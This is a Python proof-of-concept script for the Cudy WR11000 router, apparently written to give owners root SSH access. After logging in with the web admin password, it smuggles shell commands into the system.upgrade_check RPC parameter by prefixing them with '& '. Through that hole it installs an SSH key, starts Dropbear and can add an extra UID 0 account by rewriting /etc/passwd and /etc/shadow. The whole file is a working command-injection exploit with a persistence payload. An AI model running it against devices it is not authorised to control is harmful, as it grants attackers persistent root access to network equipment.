#!/usr/bin/env python3
"""
Cudy WR11000 authenticated SSH starter PoC.

This requires the router's web admin password. It does not change the web
password or firmware image. By default it only installs an owner SSH public key
and starts Dropbear on port 22. Optionally, it can add a second UID 0 account
with an SSH password by updating /etc/passwd and /etc/shadow.
"""

import getpass
import hashlib
import json
import os
from pathlib import Path
import re
import secrets
import shlex
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


ADMIN_USER = "admin"
KEY_PATH = Path(__file__).resolve().with_name("cudy_wr11000_owner_ed25519")
CRYPT_SALT_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./"


def normalize_router(value):
    value = value.strip() or "192.168.10.1"
    if "://" not in value:
        value = "http://" + value

    parsed = urllib.parse.urlparse(value)
    if not parsed.hostname:
        raise RuntimeError("could not parse router IP or URL")

    base = f"{parsed.scheme}://{parsed.netloc}"
    return base, parsed.hostname


def rpc(base, endpoint, method, params=None, auth=None):
    url = base.rstrip("/") + "/cgi-bin/luci/rpc/" + endpoint
    if auth:
        url += "?" + urllib.parse.urlencode({"auth": auth})

    body = json.dumps({"method": method, "params": params or [], "id": 1}).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        text = exc.read().decode("utf-8", "replace")
        raise RuntimeError(f"HTTP {exc.code} from {url}: {text[:240]}")


def result(reply, what):
    if reply.get("error"):
        raise RuntimeError(f"{what} failed: {reply['error']}")
    return reply.get("result")


def app_call(base, auth, method, params=None):
    return result(rpc(base, "app", method, params or [], auth=auth), method)


def login(base, password):
    salt = result(rpc(base, "auth", "salt", [ADMIN_USER]), "auth.salt")
    token = result(rpc(base, "auth", "token", [ADMIN_USER]), "auth.token")
    inner = hashlib.sha256((password + salt).encode()).hexdigest()
    secret = hashlib.sha256((inner + token).encode()).hexdigest()
    auth = result(rpc(base, "auth", "login", [ADMIN_USER, secret]), "auth.login")
    if not auth:
        raise RuntimeError("login failed")
    return auth


def one_line_shell(script):
    return "; ".join(line.strip() for line in script.splitlines() if line.strip())


def inject_shell(base, auth, script):
    injected = "& " + one_line_shell(script)
    reply = rpc(base, "app", "system.upgrade_check", [injected], auth=auth)
    if reply.get("error"):
        raise RuntimeError(f"system.upgrade_check failed: {reply['error']}")
    return reply.get("result")


def run_checked(base, auth, name, script, timeout=25):
    marker = f"owner-{name}-" + hashlib.sha256(str(time.time()).encode()).hexdigest()[:10]
    stage = one_line_shell(script)
    command = (
        f"echo -n {shlex.quote(marker + '-begin')} >/var/run/autoupgrade-status; "
        f"{stage}; "
        "rc=$?; "
        "sleep 2; "
        f"if [ \"$rc\" -eq 0 ]; then echo -n {shlex.quote(marker + '-ok')} >/var/run/autoupgrade-status; "
        f"else printf {shlex.quote(marker + '-fail:%s:')} \"$rc\" >/var/run/autoupgrade-status; "
        "cat /tmp/owner-dropbear-start.log /tmp/owner-dropbearkey.log 2>/dev/null | tr '\\n' ' ' | head -c 160 >>/var/run/autoupgrade-status; fi"
    )
    inject_shell(base, auth, command)
    status = wait_for_status(
        base,
        auth,
        lambda value: value == f"{marker}-ok" or str(value).startswith(f"{marker}-fail:"),
        timeout=timeout,
    )
    if status != f"{marker}-ok":
        raise RuntimeError(f"{name} stage failed: {status!r}")
    return status


def read_status(base, auth):
    return app_call(base, auth, "system.upgrade_checkstatus", ["000000000000"])


def wait_for_status(base, auth, predicate, timeout=15):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        try:
            last = read_status(base, auth)
        except Exception as exc:
            last = f"status read failed: {exc}"
        if predicate(last):
            return last
        time.sleep(1)
    raise RuntimeError(f"timed out waiting for router command; last status: {last!r}")


def port_open(host, port, timeout=2):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        return sock.connect_ex((host, port)) == 0


def ensure_keypair(path):
    pub_path = Path(str(path) + ".pub")
    if not path.exists() or not pub_path.exists():
        subprocess.run(
            [
                "ssh-keygen",
                "-t",
                "ed25519",
                "-N",
                "",
                "-C",
                "cudy-wr11000-owner",
                "-f",
                str(path),
            ],
            check=True,
        )
    os.chmod(path, 0o600)
    return path, pub_path.read_text().strip()


def prompt_uid0_user():
    username = input("New UID 0 SSH username (blank to skip): ").strip()
    if not username:
        return None
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_-]{0,31}", username):
        raise RuntimeError("username must start with a letter or underscore and contain only letters, numbers, '_' or '-'")
    if username == "root":
        raise RuntimeError("choose a new username; this script will not replace the built-in root account")

    while True:
        password = getpass.getpass(f"New SSH password for {username}: ")
        confirm = getpass.getpass(f"Confirm SSH password for {username}: ")
        if password != confirm:
            print("Passwords did not match; try again.")
            continue
        if len(password) < 8:
            print("Password must be at least 8 characters; try again.")
            continue
        break

    return username, md5_crypt(password)


def md5_crypt(password):
    salt = "".join(secrets.choice(CRYPT_SALT_CHARS) for _ in range(8))
    try:
        proc = subprocess.run(
            ["openssl", "passwd", "-1", "-salt", salt, "-stdin"],
            input=password + "\n",
            text=True,
            capture_output=True,
            check=True,
        )
    except (FileNotFoundError, subprocess.CalledProcessError) as exc:
        raise RuntimeError("openssl is required to hash the SSH password locally") from exc

    hashed = proc.stdout.strip()
    if not hashed.startswith(f"$1${salt}$"):
        raise RuntimeError("openssl produced an unexpected password hash")
    return hashed


def build_uid0_user_payload(username, password_hash):
    passwd_line = shlex.quote(f"{username}:x:0:0:root:/root:/bin/ash")
    shadow_line = shlex.quote(f"{username}:{password_hash}:17495:0:99999:7:::")
    return f"""
cp -a /etc/passwd /etc/passwd.owner-backup 2>/dev/null || true
cp -a /etc/shadow /etc/shadow.owner-backup 2>/dev/null || true
grep -v '^{username}:' /etc/passwd >/tmp/passwd.owner
printf '%s\\n' {passwd_line} >>/tmp/passwd.owner
cp /tmp/passwd.owner /etc/passwd
grep -v '^{username}:' /etc/shadow >/tmp/shadow.owner
printf '%s\\n' {shadow_line} >>/tmp/shadow.owner
cp /tmp/shadow.owner /etc/shadow
chmod 0644 /etc/passwd
chmod 0600 /etc/shadow
uci -q set dropbear.@dropbear[0].PasswordAuth='on' || true
uci -q set dropbear.@dropbear[0].RootPasswordAuth='on' || true
uci -q commit dropbear || true
grep -qF {passwd_line} /etc/passwd
grep -qF {shadow_line} /etc/shadow
"""


def build_key_payload(public_key):
    quoted_key = shlex.quote(public_key)
    return f"""
mkdir -p /etc/dropbear /root/.ssh
chmod 700 /etc/dropbear /root/.ssh
printf '%s\\n' {quoted_key} >/etc/dropbear/authorized_keys
printf '%s\\n' {quoted_key} >/root/.ssh/authorized_keys
chmod 600 /etc/dropbear/authorized_keys /root/.ssh/authorized_keys
"""


def build_hostkey_payload():
    return """
[ -x /usr/bin/dropbearkey ]
[ -s /etc/dropbear/dropbear_ed25519_host_key ] || rm -f /etc/dropbear/dropbear_ed25519_host_key
[ -s /etc/dropbear/dropbear_rsa_host_key ] || rm -f /etc/dropbear/dropbear_rsa_host_key
[ -s /etc/dropbear/dropbear_ed25519_host_key ] || /usr/bin/dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key
[ -s /etc/dropbear/dropbear_ed25519_host_key ]
"""


def build_start_dropbear_payload():
    return """
[ -x /usr/sbin/dropbear ]
pid="$(cat /var/run/dropbear.owner.pid 2>/dev/null)"
[ -n "$pid" ] && kill "$pid" 2>/dev/null || true
/usr/sbin/dropbear -P /var/run/dropbear.owner.pid -p 22 -r /etc/dropbear/dropbear_ed25519_host_key >/tmp/owner-dropbear-start.log 2>&1
"""


def main():
    base, host = normalize_router(input("Router IP [192.168.10.1]: "))
    password = getpass.getpass("Web admin password: ")

    print("[*] Logging in through LuCI RPC as admin")
    auth = login(base, password)

    marker = "owner-probe-" + hashlib.sha256(str(time.time()).encode()).hexdigest()[:12]
    print("[*] Verifying authenticated command execution")
    inject_shell(base, auth, f"sleep 1; echo -n {shlex.quote(marker)} >/var/run/autoupgrade-status")
    wait_for_status(base, auth, lambda value: value == marker)

    key_path, public_key = ensure_keypair(KEY_PATH)
    print(f"[*] Installing SSH key: {key_path}.pub")
    run_checked(base, auth, "key", build_key_payload(public_key))

    print("[*] Generating Dropbear host key if needed")
    run_checked(base, auth, "hostkey", build_hostkey_payload(), timeout=45)

    print("[*] Starting Dropbear on port 22")
    run_checked(base, auth, "dropbear", build_start_dropbear_payload())

    password_user = prompt_uid0_user()
    if password_user:
        username, password_hash = password_user
        print(f"[*] Creating UID 0 SSH password user: {username}")
        run_checked(base, auth, "sshuser", build_uid0_user_payload(username, password_hash))
    else:
        username = None

    print("[*] Waiting for Dropbear on port 22")
    deadline = time.time() + 35
    last_status = None
    while time.time() < deadline:
        if port_open(host, 22):
            if username:
                print(f"[*] SSH is listening; password login command: ssh {username}@{host}")
                print(f"[*] Key recovery command: ssh -i {key_path} root@{host}")
                subprocess.call(["ssh", "-o", "StrictHostKeyChecking=accept-new", f"{username}@{host}"])
            else:
                print(f"[*] SSH is listening; opening root@{host}")
                subprocess.call(
                    [
                        "ssh",
                        "-i",
                        str(key_path),
                        "-o",
                        "IdentitiesOnly=yes",
                        "-o",
                        "StrictHostKeyChecking=accept-new",
                        f"root@{host}",
                    ]
                )
            return
        try:
            last_status = read_status(base, auth)
        except Exception as exc:
            last_status = f"status read failed: {exc}"
        time.sleep(1)

    raise RuntimeError(f"port 22 did not open; last router status: {last_status!r}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted", file=sys.stderr)
        sys.exit(130)
    except Exception as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(1)
